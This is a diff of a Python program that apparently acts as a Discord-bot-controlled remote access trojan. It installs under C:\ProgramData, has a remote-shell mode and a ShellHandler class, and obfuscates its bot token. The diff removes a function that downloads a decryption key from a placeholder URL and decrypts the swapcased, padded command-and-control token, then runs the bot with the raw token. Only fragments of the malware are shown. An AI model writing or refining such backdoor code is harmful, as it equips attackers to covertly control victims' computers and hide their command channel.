@@ -23,8 +23,6 @@ import threading
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
 
-DECRYPTION_KEY_URL = "YOUR URL"
-
 first_execution = False
 
 # default(waiting for commands) shell(in remote shell)
@@ -317,20 +315,6 @@ class FulcrumUtil:
                 # Write each chunk to the file
                 f.write(chunk)
 
-    def decrypt_token(self, token):
-        # downloading the key.key file and decrypting the bot token
-        self._download_file(DECRYPTION_KEY_URL, "key.key")
-
-        with open("key.key", "rb") as f:
-            key = f.readline()
-            cipher = Fernet(key)
-            # remove obfuscation
-            decrypted_token = token.swapcase()[4:-4].encode()
-            # decrypt token
-            decrypted_token = cipher.decrypt(decrypted_token)
-        return decrypted_token.decode()
-
-
 
 class ShellHandler:
     def __init__(self):
@@ -527,8 +511,7 @@ def main():
         first_execution = True
 
     # decrypting token and starting discord bot
-    decrypted_token = fulcrum_util.decrypt_token(str(TOKEN))
-    client.run(decrypted_token)
+    client.run(TOKEN)
 
 
 if __name__ == '__main__':
